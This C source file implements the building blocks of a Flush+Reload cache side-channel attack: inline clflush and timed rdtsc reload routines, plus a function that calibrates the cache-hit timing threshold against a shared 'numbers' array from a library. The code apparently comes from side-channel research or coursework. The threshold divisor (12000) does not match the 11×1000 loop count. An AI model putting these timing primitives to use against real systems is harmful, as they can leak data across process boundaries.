#include <unistd.h>
#include <stdint.h>

#include <inttypes.h>
#include <stdlib.h>
#include <stdio.h>
#include "time.h"
#include <string.h>
#include "libnumberpic.h"

#ifdef _MSC_VER
# include <intrin.h>
#else
# include <x86intrin.h>
#endif


#define TSC_THRESHOLD_UPPER_LIMIT (50)		// Added to Average cache hit to calculate TSC Threshold
#define NUMBER_OF_ELEMENTS_IN_ARRAY (11)	// Size of numbers[] which we cache attack


volatile uint64_t junk_first_time_miss;		// First time cache fetch will be very long



inline __attribute__((always_inline)) void flush(const void *addr){
	asm volatile("mfence" ::: "memory");
	asm volatile ("clflush (%0)" :: "r"(addr));
	asm volatile("mfence" ::: "memory");
}


inline __attribute__((always_inline)) uint64_t reload(const void *addr){
	// uint64_t total_time, over_head_time;
	long long cycles_low, cycles_high, cycles_low1, cycles_high1, start, end;
	// long long ocycles_low, ocycles_high, ocycles_low1, ocycles_high1, ostart, oend;
	asm   volatile ("LFENCE\n\t"           
					"RDTSC\n\t"
					"mov %%rdx, %0\n\t"
					"mov %%rax, %1\n\t"
					: "=r" (cycles_high), "=r" (cycles_low):: "%rax", "%rbx", "%rcx", "%rdx", "memory");
	asm volatile("lfence" ::: "memory"); 
	(void) *(volatile int*)addr;
	asm volatile("lfence" ::: "memory"); 
	asm   volatile("RDTSCP\n\t"
					"mov %%rdx, %0\n\t"
					"mov %%rax, %1\n\t"
					"LFENCE\n\t": "=r" (cycles_high1), "=r" (cycles_low1):: "%rax", "%rbx", "%rcx", "%rdx", "memory"); 
	start = ( (cycles_high << 32) | cycles_low );
	end = ( (cycles_high1 << 32) | cycles_low1 );
	return (uint64_t)(end-start);
	// total_time = (uint64_t)(end-start);
	// asm   volatile ("LFENCE\n\t"           
	// 				"RDTSC\n\t"
	// 				"mov %%rdx, %0\n\t"
	// 				"mov %%rax, %1\n\t"
	// 				: "=r" (ocycles_high), "=r" (ocycles_low):: "%rax", "%rbx", "%rcx", "%rdx", "memory"); 
	// asm volatile("lfence" ::: "memory"); 
	// asm volatile("lfence" ::: "memory"); 
	// asm   volatile("RDTSCP\n\t"
	// 				"mov %%rdx, %0\n\t"
	// 				"mov %%rax, %1\n\t"
	// 				"CPUID\n\t": "=r" (ocycles_high1), "=r" (ocycles_low1):: "%rax", "%rbx", "%rcx", "%rdx", "memory"); 

	// ostart = ( (ocycles_high << 32) | ocycles_low );
	// oend = ( ( ocycles_high1 << 32) | ocycles_low1 );
	// over_head_time = (uint64_t)(oend-ostart);


	// return total_time-over_head_time;
}



uint64_t inline __attribute__((always_inline)) flush_and_reload(const void* addr) {
	uint64_t time;

	time = reload(addr);
	flush(addr);
	return time;
}


// This is not an inline function, it should not be in header file
uint64_t determing_tsc_threshold(){

	const void* addr;

	int j = 1000;
	uint64_t avg_time_cache_hit=0;//, avg_time_cache_miss=0;
	junk_first_time_miss = 0;

	for(int i =0;i<NUMBER_OF_ELEMENTS_IN_ARRAY;i++){
		addr = numbers[i];
		junk_first_time_miss = junk_first_time_miss+reload(addr);
	}

	while(j>0){
		for(int i =0;i<NUMBER_OF_ELEMENTS_IN_ARRAY;i++){
			addr = numbers[i];
			avg_time_cache_hit = avg_time_cache_hit+reload(addr);
		}

		j--;
	}

	for(int i =0;i<NUMBER_OF_ELEMENTS_IN_ARRAY;i++){
		addr = numbers[i];
		flush(addr);
	}

	return ((avg_time_cache_hit)/12000) + TSC_THRESHOLD_UPPER_LIMIT;
}




